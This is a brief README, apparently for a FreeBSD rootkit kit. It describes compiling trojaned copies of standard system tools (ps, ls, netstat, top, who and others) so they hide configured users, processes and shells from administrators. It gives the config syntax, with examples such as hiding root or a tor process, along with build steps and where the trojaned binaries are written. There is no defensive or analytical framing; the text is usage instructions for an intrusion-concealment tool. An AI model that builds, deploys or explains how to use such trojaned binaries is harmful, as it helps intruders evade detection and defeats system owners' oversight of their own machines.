This archive includes sources of original main FreeBSD filez that 
can show you are in system.
We would trojan such programs: 
	find fstat kldstat last ls netstat ps sockstat top w who

Structure.
original/ - contains src of original filez
mybin/    - will contains trojaned filez after compilation

1. 	Configuration
	just edit 'config' file to setup some vars to hide
	
	as you can see 
	common scheme: program_name:what_hide=hide_param1:hide_param2
	or             program_name:what_hide=param1-var1:param2-var2
	
	for example fstat:
	
	fstat:user=root # hide this user
	fstat:command=tor # hide this command
	fstat:command_user=csh-root:shell-root 
		# hide root with csh & shell of root
	
	you have to setup vars after = 
	who can hide as many things as you want - delimiter is ':'
	when you need to point two arguments use '-'	 

2. 	Compilation 
	type './make' - it will run perl script to parse your config file 
	and to compile these programms 

3. 	Output
 	just go to mybin/

4. 	Check...
